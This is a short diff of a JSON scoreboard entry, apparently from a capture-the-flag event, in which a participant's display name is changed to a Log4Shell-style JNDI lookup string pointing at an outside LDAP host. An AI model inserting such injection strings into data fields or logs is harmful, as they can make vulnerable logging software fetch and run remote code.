@@ -1,7 +1,7 @@
 {
     "position": 31,
     "user_id": "72c1cc6250a04e68e141585023a3e41e",
-    "name": "SNOKENDE KODEKNEKKER",
+    "name": "${jndi:ldap://anvilshop.utl/x}",
     "points": 150,
     "categories": {
         "1. Grunnleggende": 88,
